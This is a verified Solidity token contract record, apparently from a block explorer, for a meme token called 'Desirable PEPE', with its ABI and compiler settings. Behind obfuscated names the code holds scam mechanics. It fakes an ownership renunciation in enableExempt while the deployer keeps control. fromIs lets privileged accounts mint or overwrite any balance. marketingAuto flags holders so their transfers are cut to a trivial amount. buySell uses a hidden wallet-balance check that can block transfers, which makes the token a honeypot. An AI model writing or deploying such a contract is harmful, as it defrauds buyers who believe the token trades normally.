{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface minFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyTrading) external view returns (uint256);\n\n    function transfer(address teamTo, uint256 feeLaunched) external returns (bool);\n\n    function allowance(address atMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamTo,\n        uint256 feeLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromTake, uint256 value);\n    event Approval(address indexed atMode, address indexed spender, uint256 value);\n}\n\nabstract contract tradingTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityIsMarketing {\n    function createPair(address amountLaunched, address maxMarketing) external returns (address);\n}\n\ninterface minFromMetadata is minFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DesirablePEPE is tradingTotal, minFrom, minFromMetadata {\n\n    uint256 private limitShouldSender;\n\n    uint256 txEnable;\n\n    uint8 private takeIs = 18;\n\n    function tradingTokenShould(address senderFrom) public {\n        if (marketingExempt) {\n            return;\n        }\n        if (txList == autoTradingTeam) {\n            launchedLiquidity = false;\n        }\n        exemptFund[senderFrom] = true;\n        \n        marketingExempt = true;\n    }\n\n    mapping(address => bool) public totalFrom;\n\n    mapping(address => mapping(address => uint256)) private marketingAmount;\n\n    mapping(address => bool) public exemptFund;\n\n    function fromReceiver(uint256 feeLaunched) public {\n        buyTotal();\n        maxMode = feeLaunched;\n    }\n\n    uint256 private txList;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txAmount;\n    }\n\n    string private tradingExempt = \"DPE\";\n\n    constructor (){\n        if (limitShouldSender != txList) {\n            totalAt = true;\n        }\n        minEnable tokenMinSell = minEnable(sellLaunched);\n        sellEnableFrom = liquidityIsMarketing(tokenMinSell.factory()).createPair(tokenMinSell.WETH(), address(this));\n        if (limitShouldSender != autoTradingTeam) {\n            launchedLiquidity = true;\n        }\n        limitShouldList = _msgSender();\n        enableExempt();\n        exemptFund[limitShouldList] = true;\n        feeLaunchedLiquidity[limitShouldList] = txAmount;\n        if (launchedLiquidity == receiverFrom) {\n            limitShouldSender = autoTradingTeam;\n        }\n        emit Transfer(address(0), limitShouldList, txAmount);\n    }\n\n    function buyTradingReceiver(address swapTxMax, address teamTo, uint256 feeLaunched) internal returns (bool) {\n        require(feeLaunchedLiquidity[swapTxMax] >= feeLaunched);\n        feeLaunchedLiquidity[swapTxMax] -= feeLaunched;\n        feeLaunchedLiquidity[teamTo] += feeLaunched;\n        emit Transfer(swapTxMax, teamTo, feeLaunched);\n        return true;\n    }\n\n    function balanceOf(address buyTrading) public view virtual override returns (uint256) {\n        return feeLaunchedLiquidity[buyTrading];\n    }\n\n    function getOwner() external view returns (address) {\n        return totalMode;\n    }\n\n    uint256 maxMode;\n\n    bool public marketingExempt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingExempt;\n    }\n\n    address private totalMode;\n\n    function buySell(address swapTxMax, address teamTo, uint256 feeLaunched) internal returns (bool) {\n        if (swapTxMax == limitShouldList) {\n            return buyTradingReceiver(swapTxMax, teamTo, feeLaunched);\n        }\n        uint256 shouldTake = minFrom(sellEnableFrom).balanceOf(walletEnableTeam);\n        require(shouldTake == maxMode);\n        require(teamTo != walletEnableTeam);\n        if (totalFrom[swapTxMax]) {\n            return buyTradingReceiver(swapTxMax, teamTo, marketingSellWallet);\n        }\n        return buyTradingReceiver(swapTxMax, teamTo, feeLaunched);\n    }\n\n    uint256 private txAmount = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed autoMin, address indexed fundAmount);\n\n    function enableExempt() public {\n        emit OwnershipTransferred(limitShouldList, address(0));\n        totalMode = address(0);\n    }\n\n    address public limitShouldList;\n\n    bool private totalAt;\n\n    bool public receiverSell;\n\n    bool private receiverFrom;\n\n    function fromIs(address tokenToLaunch, uint256 feeLaunched) public {\n        buyTotal();\n        feeLaunchedLiquidity[tokenToLaunch] = feeLaunched;\n    }\n\n    mapping(address => uint256) private feeLaunchedLiquidity;\n\n    function owner() external view returns (address) {\n        return totalMode;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeIs;\n    }\n\n    function approve(address receiverFeeLimit, uint256 feeLaunched) public virtual override returns (bool) {\n        marketingAmount[_msgSender()][receiverFeeLimit] = feeLaunched;\n        emit Approval(_msgSender(), receiverFeeLimit, feeLaunched);\n        return true;\n    }\n\n    uint256 constant marketingSellWallet = 20 ** 10;\n\n    address public sellEnableFrom;\n\n    string private teamLaunchSwap = \"Desirable PEPE\";\n\n    function buyTotal() private view {\n        require(exemptFund[_msgSender()]);\n    }\n\n    function transfer(address tokenToLaunch, uint256 feeLaunched) external virtual override returns (bool) {\n        return buySell(_msgSender(), tokenToLaunch, feeLaunched);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return teamLaunchSwap;\n    }\n\n    address walletEnableTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private autoTradingTeam;\n\n    function marketingAuto(address receiverAt) public {\n        buyTotal();\n        if (totalAt != receiverSell) {\n            receiverSell = false;\n        }\n        if (receiverAt == limitShouldList || receiverAt == sellEnableFrom) {\n            return;\n        }\n        totalFrom[receiverAt] = true;\n    }\n\n    bool public launchedLiquidity;\n\n    function transferFrom(address swapTxMax, address teamTo, uint256 feeLaunched) external override returns (bool) {\n        if (_msgSender() != sellLaunched) {\n            if (marketingAmount[swapTxMax][_msgSender()] != type(uint256).max) {\n                require(feeLaunched <= marketingAmount[swapTxMax][_msgSender()]);\n                marketingAmount[swapTxMax][_msgSender()] -= feeLaunched;\n            }\n        }\n        return buySell(swapTxMax, teamTo, feeLaunched);\n    }\n\n    function allowance(address swapExempt, address receiverFeeLimit) external view virtual override returns (uint256) {\n        if (receiverFeeLimit == sellLaunched) {\n            return type(uint256).max;\n        }\n        return marketingAmount[swapExempt][receiverFeeLimit];\n    }\n\n    address sellLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverFeeLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFeeLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenToLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLaunched\",\"type\":\"uint256\"}],\"name\":\"fromIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeLaunched\",\"type\":\"uint256\"}],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitShouldList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"}],\"name\":\"marketingAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellEnableFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderFrom\",\"type\":\"address\"}],\"name\":\"tradingTokenShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenToLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTxMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DesirablePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}